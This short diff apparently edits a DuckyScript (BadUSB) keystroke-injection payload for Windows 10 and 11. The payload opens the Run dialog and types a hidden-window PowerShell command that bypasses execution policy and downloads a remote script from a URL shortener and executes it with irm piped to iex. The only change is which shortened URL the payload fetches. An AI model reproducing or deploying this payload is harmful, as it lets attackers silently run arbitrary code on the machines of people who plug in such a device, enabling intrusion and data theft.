@@ -8,5 +8,5 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='your-file-to-drop-here';irm https://shorturl.at/ptwS6 | iex
+STRING powershell -w h -NoP -Ep Bypass $dc='your-file-to-drop-here';irm https://shorturl.at/jeL34 | iex
 ENTER
